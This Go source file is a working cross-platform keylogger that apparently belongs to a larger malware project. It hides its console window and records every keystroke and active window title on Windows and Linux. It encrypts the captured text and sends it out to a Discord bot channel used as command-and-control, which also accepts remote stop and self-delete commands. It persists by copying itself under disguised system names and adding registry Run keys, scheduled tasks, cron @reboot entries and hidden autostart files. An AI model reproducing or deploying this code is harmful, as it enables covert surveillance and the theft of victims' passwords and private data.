package keylogger

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"programa/utils"

	"github.com/bwmarrin/discordgo"
)

func StartKeylogger() {
	hideConsole()

	establishKeyloggerPersistence()

	channelID, err := createDiscordChannel()
	if err != nil {
		fmt.Printf("Failed to connect to C2: %v\n", err)
		os.Exit(1)
	}

	discordChannelID = channelID

	go startKeylogger()

	go monitorDiscordCommands()

	go flushBufferPeriodically()

	select {}
}

func hideConsole() {
	if runtime.GOOS == "windows" {
		exec.Command("powershell", "-Command", "Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'; $consolePtr = [Console.Window]::GetConsoleWindow(); [Console.Window]::ShowWindow($consolePtr, 0)").Run()
	}
}

func createDiscordChannel() (string, error) {
	if err := utils.EnsureDiscordConfig(); err != nil {
		return "", err
	}

	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
	if err != nil {
		return "", err
	}
	defer dg.Close()

	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = utils.GetLocalIP()
	}
	if hostname == "" || hostname == "Unknown" {
		hostname = utils.GetMACAddress()
	}

	channelName := fmt.Sprintf("klg-%s", utils.SanitizeChannelName(hostname))

	channel, err := dg.GuildChannelCreate(utils.DiscordGuildID, channelName, discordgo.ChannelTypeGuildText)
	if err != nil {
		return "", err
	}

	err = dg.ChannelPermissionSet(
		channel.ID,
		utils.DiscordGuildID,
		discordgo.PermissionOverwriteTypeRole,
		0,
		discordgo.PermissionViewChannel,
	)

	systemInfo := gatherSystemInfo()
	dg.ChannelMessageSend(channel.ID, systemInfo)

	return channel.ID, nil
}

func gatherSystemInfo() string {
	hostname := utils.GetHostname()
	username := utils.GetUsername()

	embed := ""
	if strings.TrimSpace(EmbedFileDescription) != "" || strings.TrimSpace(EmbedCompanyName) != "" || strings.TrimSpace(EmbedProductVersion) != "" {
		embed = fmt.Sprintf(`
**📎 EMBED**
- **Description:** %s
- **Company:** %s
- **Version:** %s
`, EmbedFileDescription, EmbedCompanyName, EmbedProductVersion)
	}
	return fmt.Sprintf(`
🔴 **KEYLOGGER ACTIVATED** 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📍 SYSTEM INFO**
- **Hostname:** %s
- **Username:** %s
- **IP:** %s
- **MAC:** %s
- **OS:** %s
- **Started:** %s
%s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Commands:**
/stoplogger - Stop logging
/deletelogger - Remove from system

**Status:** 🟢 Active
`,
		hostname,
		username,
		utils.GetLocalIP(),
		utils.GetMACAddress(),
		utils.GetOS(),
		time.Now().Format("2006-01-02 15:04:05"),
		embed,
	)
}

func startKeylogger() {
	if runtime.GOOS == "windows" {
		keylogWindows()
	} else {
		keylogLinux()
	}
}

func keylogWindows() {
	psScript := `
Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    
    public static string GetActiveWindowTitle() {
        const int nChars = 256;
        StringBuilder Buff = new StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();
        if (GetWindowText(handle, Buff, nChars) > 0) {
            return Buff.ToString();
        }
        return null;
    }
}
"@

$lastWindow = ""
while($true) {
    Start-Sleep -Milliseconds 10
    
    $currentWindow = [KeyLogger]::GetActiveWindowTitle()
    if($currentWindow -ne $lastWindow -and $currentWindow -ne $null) {
        $lastWindow = $currentWindow
        Write-Host "[WINDOW:$currentWindow]"
    }
    
    for($i=8; $i -le 190; $i++) {
        $state = [KeyLogger]::GetAsyncKeyState($i)
        if($state -eq -32767) {
            $key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i)
            if($key) {
                Write-Host $key
            }
        }
    }
}
`

	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psScript)
	stdout, _ := cmd.StdoutPipe()
	cmd.Start()

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		line := scanner.Text()
		processKeyPress(line)
	}
}

func keylogLinux() {
	devices := findKeyboardDevices()

	if len(devices) == 0 {
		fallbackLinuxKeylog()
		return
	}

	for _, device := range devices {
		go readLinuxKeyboard(device)
	}
}

func findKeyboardDevices() []string {
	var devices []string

	files, err := os.ReadDir("/dev/input")
	if err != nil {
		return devices
	}

	for _, file := range files {
		if strings.HasPrefix(file.Name(), "event") {
			devicePath := filepath.Join("/dev/input", file.Name())
			namePath := filepath.Join("/sys/class/input", file.Name(), "device", "name")
			b, err := os.ReadFile(namePath)
			if err != nil {
				continue
			}
			lower := strings.ToLower(strings.TrimSpace(string(b)))
			if strings.Contains(lower, "keyboard") || strings.Contains(lower, "keypad") ||
				(strings.Contains(lower, "hid") && strings.Contains(lower, "key")) {
				devices = append(devices, devicePath)
			}
		}
	}

	return devices
}

func readLinuxKeyboard(device string) {
	file, err := os.Open(device)
	if err != nil {
		return
	}
	defer file.Close()

	buffer := make([]byte, 24)

	for isRunning {
		n, err := file.Read(buffer)
		if err != nil || n != 24 {
			continue
		}

		eventType := uint16(buffer[16]) | uint16(buffer[17])<<8
		code := uint16(buffer[18]) | uint16(buffer[19])<<8
		value := int32(buffer[20]) | int32(buffer[21])<<8 | int32(buffer[22])<<16 | int32(buffer[23])<<24

		if eventType == 1 && value == 1 {
			key := linuxKeycodeToString(code)
			if key != "" {
				processKeyPress(key)
			}
		}
	}
}

func fallbackLinuxKeylog() {
	cmd := exec.Command("xinput", "test-xi2", "--root")
	stdout, _ := cmd.StdoutPipe()
	cmd.Start()

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "KeyPress") {
			processKeyPress(line)
		}
	}
}

func linuxKeycodeToString(code uint16) string {
	keycodes := map[uint16]string{
		1: "[ESC]", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
		12: "-", 13: "=", 14: "[BACK]", 15: "[TAB]", 16: "q", 17: "w", 18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p",
		26: "[", 27: "]", 28: "[ENTER]", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k", 38: "l",
		39: ";", 40: "'", 41: "`", 42: "[SHIFT]", 43: "\\", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
		51: ",", 52: ".", 53: "/", 54: "[RSHIFT]", 56: "[ALT]", 57: " ", 58: "[CAPS]", 59: "[F1]", 60: "[F2]", 61: "[F3]", 62: "[F4]", 63: "[F5]", 64: "[F6]", 65: "[F7]", 66: "[F8]", 67: "[F9]", 68: "[F10]", 69: "[F11]", 70: "[F12]",
		71: "[SCROLL]", 72: "[PAUSE]", 73: "[INSERT]", 74: "[HOME]", 75: "[PAGEUP]", 76: "[DEL]", 77: "[END]", 78: "[PAGEDOWN]", 79: "[RIGHT]", 80: "[LEFT]", 81: "[DOWN]", 82: "[UP]",
		83: "[NUMLOCK]", 84: "[KP/]", 85: "[KP*]", 86: "[KP-]", 87: "[KP+]", 88: "[KPENTER]", 89: "[KP1]", 90: "[KP2]", 91: "[KP3]", 92: "[KP4]", 93: "[KP5]", 94: "[KP6]", 95: "[KP7]", 96: "[KP8]", 97: "[KP9]", 98: "[KP0]", 99: "[KP.]",
		100: "[102ND]", 101: "[RO]", 102: "[KATAKANA]", 103: "[HIRAGANA]", 104: "[HENKAN]", 105: "[KATAKANA/HIRAGANA]", 106: "[MUHENKAN]", 107: "[KPJPCOMMA]", 108: "[KPENTER]", 109: "[RCTRL]", 110: "[KP/]", 111: "[SYSRQ]", 112: "[RALT]", 113: "[LINEFEED]", 114: "[HOME]", 115: "[UP]", 116: "[PAGEUP]", 117: "[LEFT]", 118: "[RIGHT]", 119: "[END]", 120: "[DOWN]", 121: "[PAGEDOWN]", 122: "[INSERT]", 123: "[DEL]", 124: "[MACRO]", 125: "[MUTE]", 126: "[VOLUMEDOWN]", 127: "[VOLUMEUP]",
		128: "[POWER]", 129: "[KP=]", 130: "[KP+/-]", 131: "[PAUSE]", 132: "[SCALE]", 133: "[KP,]", 134: "[HANGEUL]", 135: "[HANJA]", 136: "[YEN]", 137: "[LEFTMETA]", 138: "[RIGHTMETA]", 139: "[COMPOSE]", 140: "[STOP]", 141: "[AGAIN]", 142: "[PROPS]", 143: "[UNDO]", 144: "[FRONT]", 145: "[COPY]", 146: "[OPEN]", 147: "[PASTE]", 148: "[FIND]", 149: "[CUT]", 150: "[HELP]", 151: "[MENU]", 152: "[CALC]", 153: "[SETUP]", 154: "[SLEEP]", 155: "[WAKEUP]", 156: "[FILE]", 157: "[SENDFILE]", 158: "[DELETEFILE]", 159: "[XFER]", 160: "[PROG1]", 161: "[PROG2]", 162: "[WWW]", 163: "[MSDOS]", 164: "[SCREENLOCK]", 165: "[DIRECTION]", 166: "[CYCLEWINDOWS]", 167: "[MAIL]", 168: "[BOOKMARKS]", 169: "[COMPUTER]", 170: "[BACK]", 171: "[FORWARD]", 172: "[CLOSECD]", 173: "[EJECTCD]", 174: "[EJECTCLOSECD]", 175: "[NEXTSONG]", 176: "[PLAYPAUSE]", 177: "[PREVIOUSSONG]", 178: "[STOPCD]", 179: "[RECORD]", 180: "[REWIND]", 181: "[PHONE]", 182: "[ISO]", 183: "[CONFIG]", 184: "[HOMEPAGE]", 185: "[REFRESH]", 186: "[EXIT]", 187: "[MOVE]", 188: "[EDIT]", 189: "[SCROLLUP]", 190: "[SCROLLDOWN]", 191: "[KPLEFTPAREN]", 192: "[KPRIGHTPAREN]", 193: "[NEW]", 194: "[REDO]",
	}

	if key, ok := keycodes[code]; ok {
		return key
	}
	return ""
}

func processKeyPress(key string) {
	if !isRunning {
		return
	}

	key = normalizeKey(key)

	bufferMutex.Lock()
	keyBuffer = append(keyBuffer, key)
	lastKeyTime = time.Now()
	bufferMutex.Unlock()

	if len(keyBuffer) >= BUFFER_SIZE {
		flushBuffer()
	}
}

func normalizeKey(key string) string {
	key = strings.TrimSpace(key)
	if strings.HasPrefix(key, "[WINDOW:") {
		return "\n\n" + key
	}
	switch {
	case key == "Space":
		return " "
	case key == "Return":
		return "[ENTER]"
	case key == "Back":
		return "[BACK]"
	case key == "Tab":
		return "[TAB]"
	case key == "Shift" || key == "LShiftKey" || key == "RShiftKey":
		return ""
	case key == "Control" || key == "LControlKey" || key == "RControlKey":
		return ""
	case key == "Alt" || key == "LMenu" || key == "RMenu":
		return ""
	case key == "Capital":
		return "[CAPS]"
	case key == "Escape":
		return "[ESC]"
	}
	if len(key) == 1 {
		return key
	}
	if strings.HasPrefix(key, "D") && len(key) == 2 && key[1] >= '0' && key[1] <= '9' {
		return string(key[1])
	}
	return ""
}

func flushBufferPeriodically() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if !isRunning {
			return
		}

		bufferMutex.Lock()
		timeSinceLastKey := time.Since(lastKeyTime)
		hasKeys := len(keyBuffer) > 0
		bufferMutex.Unlock()

		if hasKeys && timeSinceLastKey > IDLE_TIMEOUT {
			flushBuffer()
		}
	}
}

func flushBuffer() {
	bufferMutex.Lock()
	if len(keyBuffer) == 0 {
		bufferMutex.Unlock()
		return
	}

	keys := make([]string, len(keyBuffer))
	copy(keys, keyBuffer)
	keyBuffer = []string{}
	bufferMutex.Unlock()

	content := strings.Join(keys, "")

	encrypted := encryptText(content)

	sendToDiscord(encrypted)
}

func encryptText(text string) string {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return base64.StdEncoding.EncodeToString([]byte(text))
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return base64.StdEncoding.EncodeToString([]byte(text))
	}

	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)

	ciphertext := gcm.Seal(nonce, nonce, []byte(text), nil)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

func sendToDiscord(content string) {
	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
	if err != nil {
		return
	}
	defer dg.Close()

	timestamp := time.Now().Format("15:04:05")
	message := fmt.Sprintf("```\n[%s]\n%s\n```", timestamp, content)

	dg.ChannelMessageSend(discordChannelID, message)
}

func monitorDiscordCommands() {
	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
	if err != nil {
		return
	}
	defer dg.Close()

	for isRunning {
		messages, err := dg.ChannelMessages(discordChannelID, 5, "", "", "")
		if err != nil {
			time.Sleep(POLL_INTERVAL)
			continue
		}

		if len(messages) == 0 {
			time.Sleep(POLL_INTERVAL)
			continue
		}

		for i := 0; i < len(messages); i++ {
			msg := messages[i]
			if msg.Author.Bot {
				continue
			}
			command := strings.ToLower(strings.TrimSpace(msg.Content))
			if command != "/stoplogger" && command != "/deletelogger" {
				continue
			}
			if msg.ID == lastMessageID {
				break
			}
			lastMessageID = msg.ID
			switch command {
			case "/stoplogger":
				dg.ChannelMessageSend(discordChannelID, "🛑 **Keylogger stopped**")
				stopLogger()
			case "/deletelogger":
				dg.ChannelMessageSend(discordChannelID, "🗑️ **Removing keylogger from system...**")
				deleteLogger()
				dg.ChannelMessageSend(discordChannelID, "✅ **Keylogger removed**")
				os.Exit(0)
			}
			break
		}

		time.Sleep(POLL_INTERVAL)
	}
}

func stopLogger() {
	isRunning = false
	flushBuffer()
	time.Sleep(2 * time.Second)
	os.Exit(0)
}

func deleteLogger() {
	isRunning = false
	flushBuffer()

	removeKeyloggerPersistence()

	exePath, _ := os.Executable()

	if runtime.GOOS == "windows" {
		exec.Command("cmd", "/C", "timeout /t 2 && del /F /Q", exePath).Start()
	} else {
		exec.Command("sh", "-c", fmt.Sprintf("sleep 2 && rm -f %s", exePath)).Start()
	}
}

func establishKeyloggerPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	if runtime.GOOS == "windows" {
		locations := []string{
			filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "svchost.exe"),
			filepath.Join(os.Getenv("TEMP"), "winlogon.exe"),
			filepath.Join(os.Getenv("LOCALAPPDATA"), "system32.exe"),
		}

		for _, dest := range locations {
			os.MkdirAll(filepath.Dir(dest), 0755)
			copyFileKeylogger(exePath, dest)
		}

		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsServices", "/t", "REG_SZ", "/d", locations[0], "/f").Run()

		exec.Command("schtasks", "/create", "/tn", "SystemServices", "/tr", locations[0],
			"/sc", "onlogon", "/rl", "highest", "/f").Run()

		startupFolder := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "services.exe")
		copyFileKeylogger(exePath, startupFolder)

	} else {
		locations := []string{
			"/tmp/.systemd-private",
			filepath.Join(os.Getenv("HOME"), ".config", "autostart", "system-update"),
		}

		for _, dest := range locations {
			os.MkdirAll(filepath.Dir(dest), 0755)
			copyFileKeylogger(exePath, dest)
			os.Chmod(dest, 0755)
		}

		cronJob := fmt.Sprintf("@reboot %s\n", locations[0])
		exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob)).Run()

		desktopEntry := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=System Update
Exec=%s
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
`, locations[1])

		autostartPath := filepath.Join(os.Getenv("HOME"), ".config", "autostart", "system-update.desktop")
		os.MkdirAll(filepath.Dir(autostartPath), 0755)
		os.WriteFile(autostartPath, []byte(desktopEntry), 0644)
	}
}

func removeKeyloggerPersistence() {
	if runtime.GOOS == "windows" {
		locations := []string{
			filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "svchost.exe"),
			filepath.Join(os.Getenv("TEMP"), "winlogon.exe"),
			filepath.Join(os.Getenv("LOCALAPPDATA"), "system32.exe"),
			filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "services.exe"),
		}

		for _, path := range locations {
			os.Remove(path)
		}

		exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsServices", "/f").Run()

		exec.Command("schtasks", "/delete", "/tn", "SystemServices", "/f").Run()

	} else {
		locations := []string{
			"/tmp/.systemd-private",
			filepath.Join(os.Getenv("HOME"), ".config", "autostart", "system-update"),
			filepath.Join(os.Getenv("HOME"), ".config", "autostart", "system-update.desktop"),
		}

		for _, path := range locations {
			os.Remove(path)
		}

		exec.Command("sh", "-c", "crontab -l | grep -v '.systemd-private' | crontab -").Run()
	}
}

func copyFileKeylogger(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, input, 0755)
}
